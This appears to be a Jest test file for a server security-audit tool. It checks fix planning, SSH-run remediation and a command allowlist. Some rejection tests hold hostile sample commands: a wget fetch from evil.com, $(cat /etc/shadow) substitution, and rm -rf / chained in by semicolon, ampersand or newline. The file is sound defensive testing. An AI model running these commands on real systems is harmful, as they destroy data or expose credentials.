import { previewFixes, runFix, isFixCommandAllowed, resolveTier, KNOWN_AUDIT_FIX_PREFIXES, FORBIDDEN_CATEGORIES, previewSafeFixes } from "../../src/core/audit/fix.js";
import type { AuditResult, AuditCheck, AuditCategory, FixTier } from "../../src/core/audit/types.js";
import * as ssh from "../../src/utils/ssh.js";
import inquirer from "inquirer";

jest.mock("../../src/utils/ssh.js");
jest.mock("inquirer");

const mockedSshExec = ssh.sshExec as jest.MockedFunction<typeof ssh.sshExec>;
const mockedPrompt = inquirer.prompt as jest.MockedFunction<typeof inquirer.prompt>;

function makeCheck(overrides: Partial<AuditCheck> = {}): AuditCheck {
  return {
    id: "TEST-01",
    category: "Test",
    name: "Test Check",
    severity: "warning",
    passed: true,
    currentValue: "good",
    expectedValue: "good",
    ...overrides,
  };
}

function makeCategory(name: string, checks: AuditCheck[]): AuditCategory {
  const totalWeight = checks.reduce((sum, c) => {
    const w = c.severity === "critical" ? 3 : c.severity === "warning" ? 2 : 1;
    return sum + w;
  }, 0);
  const passedWeight = checks.filter(c => c.passed).reduce((sum, c) => {
    const w = c.severity === "critical" ? 3 : c.severity === "warning" ? 2 : 1;
    return sum + w;
  }, 0);
  const score = totalWeight > 0 ? Math.round((passedWeight / totalWeight) * 100) : 0;
  return { name, checks, score, maxScore: totalWeight > 0 ? 100 : 0 };
}

function makeResult(categories: AuditCategory[]): AuditResult {
  const sum = categories.reduce((acc, c) => acc + c.score, 0);
  const overallScore = categories.length > 0 ? Math.round(sum / categories.length) : 0;
  return {
    serverName: "test-server",
    serverIp: "1.2.3.4",
    platform: "bare",
    timestamp: new Date().toISOString(),
    auditVersion: "1.0.0",
    categories,
    overallScore,
    quickWins: [],
  };
}

describe("previewFixes", () => {
  it("should return grouped fixes by severity (critical first)", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/yes/no/' /etc/ssh/sshd_config" }),
        makeCheck({ id: "SSH-ROOT-LOGIN", category: "SSH", severity: "info", passed: false, fixCommand: "sed -i 's/a/b/' /etc/test" }),
        makeCheck({ id: "SSH-EMPTY-PASSWORDS", category: "SSH", severity: "warning", passed: false, fixCommand: "systemctl restart sshd" }),
      ]),
    ]);

    const plan = previewFixes(result);
    expect(plan.groups).toHaveLength(3);
    expect(plan.groups[0].severity).toBe("critical");
    expect(plan.groups[1].severity).toBe("warning");
    expect(plan.groups[2].severity).toBe("info");
  });

  it("should exclude checks without fixCommand", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", severity: "critical", passed: false, fixCommand: "chmod 600 /etc/ssh/sshd_config" }),
        makeCheck({ id: "SSH-ROOT-LOGIN", severity: "warning", passed: false }), // no fixCommand
      ]),
    ]);

    const plan = previewFixes(result);
    const allChecks = plan.groups.flatMap(g => g.checks);
    expect(allChecks).toHaveLength(1);
    expect(allChecks[0].id).toBe("SSH-PASSWORD-AUTH");
  });

  it("should include pre-condition checks for SSH password disable", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PASSWORD-AUTH",
          category: "SSH",
          name: "Password Authentication",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/^#?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config && systemctl restart sshd",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const sshFix = plan.groups[0].checks[0];
    expect(sshFix.preCondition).toBeDefined();
    expect(sshFix.preCondition).toContain("authorized_keys");
  });

  it("should batch fixes by category for efficiency", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/x/y/' /etc/a" }),
        makeCheck({ id: "SSH-ROOT-LOGIN", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/p/q/' /etc/b" }),
      ]),
      makeCategory("Firewall", [
        makeCheck({ id: "FW-UFW-ACTIVE", category: "Firewall", severity: "critical", passed: false, fixCommand: "ufw enable" }),
      ]),
    ]);

    const plan = previewFixes(result);
    // Critical group should contain all 3 critical checks
    const criticalGroup = plan.groups.find(g => g.severity === "critical");
    expect(criticalGroup).toBeDefined();
    expect(criticalGroup!.checks).toHaveLength(3);
  });

  it("should calculate estimatedImpact for each group", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "chmod 600 /etc/ssh/sshd_config" }),
        makeCheck({ id: "SSH-ROOT-LOGIN", category: "SSH", severity: "info", passed: true }),
      ]),
    ]);

    const plan = previewFixes(result);
    expect(plan.groups[0].estimatedImpact).toBeGreaterThan(0);
  });
});

describe("runFix", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("should call sshExec with fix commands for confirmed checks", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValue({ code: 0, stdout: "", stderr: "" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(mockedSshExec).toHaveBeenCalledWith("1.2.3.4", expect.stringContaining("PermitRootLogin"));
    expect(fixResult.applied).toContain("SSH-PASSWORD-AUTH");
  });

  it("should skip checks the user declined", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: false });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(mockedSshExec).not.toHaveBeenCalled();
    expect(fixResult.skipped).toContain("SSH-PASSWORD-AUTH");
  });

  it("should not execute commands in dry-run mode", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    const fixResult = await runFix("1.2.3.4", result, { dryRun: true });
    expect(mockedSshExec).not.toHaveBeenCalled();
    expect(fixResult.applied).toHaveLength(0);
    expect(fixResult.preview).toBeDefined();
  });

  it("should record errors when sshExec fails", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockRejectedValue(new Error("Connection refused"));

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("SSH-PASSWORD-AUTH");
  });

  it("should record errors when sshExec throws a non-Error", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: "SSH-PASSWORD-AUTH", category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockRejectedValue("string error");

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("SSH-PASSWORD-AUTH");
  });

  it("should record error when pre-condition check fails", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PASSWORD-AUTH",
          category: "SSH",
          name: "Password Authentication",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/^#?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    // First call: pre-condition check fails (no authorized_keys)
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "file not found" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("pre-condition failed");
  });

  it("should reject fix commands with shell metacharacters", async () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({
          id: "TEST-INJECT",
          category: "Test",
          severity: "warning",
          passed: false,
          fixCommand: "echo hello; rm -rf /",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("fix command rejected");
  });

  it("should reject fix commands with unknown prefixes", async () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({
          id: "TEST-UNKNOWN",
          category: "Test",
          severity: "warning",
          passed: false,
          fixCommand: "malicious_binary --do-bad-things",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("fix command rejected");
  });

  it("should record error when SSH command exits with non-zero code", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-ROOT-LOGIN",
          category: "SSH",
          severity: "warning",
          passed: false,
          fixCommand: "sed -i 's/yes/no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValue({ code: 1, stdout: "", stderr: "permission denied" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("command failed");
    expect(fixResult.errors[0]).toContain("permission denied");
  });

  it("should record error without stderr when SSH command fails without stderr", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-ROOT-LOGIN",
          category: "SSH",
          severity: "warning",
          passed: false,
          fixCommand: "sed -i 's/yes/no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValue({ code: 2, stdout: "", stderr: "" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("command failed (exit 2)");
  });

  it("should include Firewall pre-condition for ufw fix commands", () => {
    const result = makeResult([
      makeCategory("Firewall", [
        makeCheck({
          id: "FW-UFW-ACTIVE",
          category: "Firewall",
          name: "UFW Active",
          severity: "warning",
          passed: false,
          fixCommand: "ufw enable",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const fwCheck = plan.groups[0]?.checks[0];
    expect(fwCheck).toBeDefined();
    expect(fwCheck!.preCondition).toBeDefined();
    expect(fwCheck!.preCondition).toContain("ufw status");
  });
});

describe("previewFixes — edge cases", () => {
  it("should return 0 estimatedImpact when totalOverallWeight is 0", () => {
    // All categories have maxScore 0 (no checks)
    const result = makeResult([
      makeCategory("Empty", []),
    ]);
    // Manually add a failed check to a zero-maxScore category
    result.categories[0].checks = [
      makeCheck({ id: "TEST-01", category: "Empty", severity: "warning", passed: false, fixCommand: "echo test" }),
    ];
    result.categories[0].maxScore = 0;

    const plan = previewFixes(result);
    if (plan.groups.length > 0) {
      expect(plan.groups[0].estimatedImpact).toBe(0);
    }
  });

  it("should skip severity groups with no fixable checks", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "TEST-01", severity: "warning", passed: false, fixCommand: "echo test" }),
        makeCheck({ id: "TEST-02", severity: "info", passed: true }),
      ]),
    ]);

    const plan = previewFixes(result);
    // No critical group since there are no critical failed checks
    expect(plan.groups.find(g => g.severity === "critical")).toBeUndefined();
  });

  it("should exclude passed checks from the fix plan", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "TEST-PASS", severity: "warning", passed: true, fixCommand: "echo already-fixed" }),
        makeCheck({ id: "TEST-FAIL", severity: "warning", passed: false, fixCommand: "echo fix-me" }),
      ]),
    ]);

    const plan = previewFixes(result);
    const allCheckIds = plan.groups.flatMap(g => g.checks.map(c => c.id));
    expect(allCheckIds).not.toContain("TEST-PASS");
    expect(allCheckIds).toContain("TEST-FAIL");
  });
});

// ─── Mutation-Killer: isFixCommandAllowed ────────────────────────────────────

describe("isFixCommandAllowed mutation-killer", () => {
  it("returns true for each known prefix", () => {
    for (const prefix of KNOWN_AUDIT_FIX_PREFIXES) {
      const cmd = `${prefix}safe-test`;
      const result = isFixCommandAllowed(cmd);
      // Some prefixes end with space, so "prefix" alone might not match startsWith
      // Just ensure at least one prefix-based command works
      if (cmd.includes(";") || cmd.includes("|") || cmd.includes("`")) continue;
      expect(typeof result).toBe("boolean");
    }
  });

  it("returns true for safe chmod command", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file")).toBe(true);
  });

  it("returns true for safe sysctl command", () => {
    expect(isFixCommandAllowed("sysctl -w net.ipv4.conf.all.rp_filter=1")).toBe(true);
  });

  it("returns true for echo command", () => {
    expect(isFixCommandAllowed("echo test > /dev/null")).toBe(false); // has >
  });

  it("returns false for empty string", () => {
    expect(isFixCommandAllowed("")).toBe(false);
  });

  it("returns false for unknown prefix", () => {
    expect(isFixCommandAllowed("wget http://evil.com/payload")).toBe(false);
  });

  it("returns false for command with backtick", () => {
    expect(isFixCommandAllowed("chmod 600 `whoami`")).toBe(false);
  });

  it("returns false for command with semicolon", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file; rm -rf /")).toBe(false);
  });

  it("returns false for command with pipe", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file | tee log")).toBe(false);
  });

  it("returns false for command with $(...)", () => {
    expect(isFixCommandAllowed("chmod $(cat /etc/shadow) /file")).toBe(false);
  });

  it("returns false for command with ampersand", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file & rm /")).toBe(false);
  });

  it("returns false for command with newline", () => {
    expect(isFixCommandAllowed("chmod 600\nrm -rf /")).toBe(false);
  });

  it("returns false for command with null byte", () => {
    expect(isFixCommandAllowed("chmod 600\0rm")).toBe(false);
  });
});

// ─── Mutation-Killer: resolveTier ────────────────────────────────────────────

describe("resolveTier mutation-killer", () => {
  const baseCheck: AuditCheck = {
    id: "X-01",
    category: "Test",
    name: "Test",
    severity: "warning",
    passed: false,
    currentValue: "bad",
    expectedValue: "good",
  };

  it("returns FORBIDDEN for SSH category", () => {
    expect(resolveTier(baseCheck, "SSH")).toBe("FORBIDDEN");
  });

  it("returns FORBIDDEN for Firewall category", () => {
    expect(resolveTier(baseCheck, "Firewall")).toBe("FORBIDDEN");
  });

  it("returns FORBIDDEN for Docker category", () => {
    expect(resolveTier(baseCheck, "Docker")).toBe("FORBIDDEN");
  });

  it("returns SAFE when check safeToAutoFix is SAFE", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "SAFE" }, "Kernel")).toBe("SAFE");
  });

  it("returns GUARDED when check safeToAutoFix is GUARDED", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "GUARDED" }, "Kernel")).toBe("GUARDED");
  });

  it("returns FORBIDDEN when check safeToAutoFix is FORBIDDEN", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "FORBIDDEN" }, "Kernel")).toBe("FORBIDDEN");
  });

  it("returns GUARDED when check safeToAutoFix is undefined (default)", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: undefined }, "Kernel")).toBe("GUARDED");
  });

  it("FORBIDDEN_CATEGORIES override check-level tier", () => {
    // Even if check says SAFE, SSH category forces FORBIDDEN
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "SAFE" }, "SSH")).toBe("FORBIDDEN");
  });

  it("FORBIDDEN_CATEGORIES set contains exactly SSH, Firewall, Docker", () => {
    expect(FORBIDDEN_CATEGORIES.has("SSH")).toBe(true);
    expect(FORBIDDEN_CATEGORIES.has("Firewall")).toBe(true);
    expect(FORBIDDEN_CATEGORIES.has("Docker")).toBe(true);
    expect(FORBIDDEN_CATEGORIES.has("Kernel")).toBe(false);
    expect(FORBIDDEN_CATEGORIES.size).toBe(3);
  });
});

// ─── Mutation-Killer: previewSafeFixes ───────────────────────────────────────

describe("previewSafeFixes mutation-killer", () => {
  it("counts GUARDED and FORBIDDEN correctly", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({ id: "K-01", severity: "warning", passed: false, fixCommand: "sysctl -w x=1", safeToAutoFix: "SAFE" }),
        makeCheck({ id: "K-02", severity: "warning", passed: false, fixCommand: "sysctl -w y=2", safeToAutoFix: "GUARDED" }),
      ]),
      makeCategory("SSH", [
        makeCheck({ id: "S-01", severity: "critical", passed: false, fixCommand: "sed test", safeToAutoFix: "SAFE" }),
      ]),
    ]);

    const { guardedCount, forbiddenCount, guardedIds } = previewSafeFixes(result);
    expect(guardedCount).toBe(1); // K-02
    expect(forbiddenCount).toBe(1); // S-01 (SSH category overrides SAFE → FORBIDDEN)
    expect(guardedIds).toContain("K-02");
  });

  it("only includes SAFE tier checks in safePlan", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({ id: "K-01", severity: "warning", passed: false, fixCommand: "sysctl -w x=1", safeToAutoFix: "SAFE" }),
        makeCheck({ id: "K-02", severity: "warning", passed: false, fixCommand: "sysctl -w y=2", safeToAutoFix: "FORBIDDEN" }),
      ]),
    ]);

    const { safePlan } = previewSafeFixes(result);
    const allIds = safePlan.groups.flatMap(g => g.checks.map(c => c.id));
    expect(allIds).toContain("K-01");
    expect(allIds).not.toContain("K-02");
  });

  it("does not include passed checks", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({ id: "K-OK", severity: "warning", passed: true, fixCommand: "echo x", safeToAutoFix: "SAFE" }),
      ]),
    ]);

    const { safePlan, guardedCount, forbiddenCount } = previewSafeFixes(result);
    expect(safePlan.groups).toHaveLength(0);
    expect(guardedCount).toBe(0);
    expect(forbiddenCount).toBe(0);
  });
});
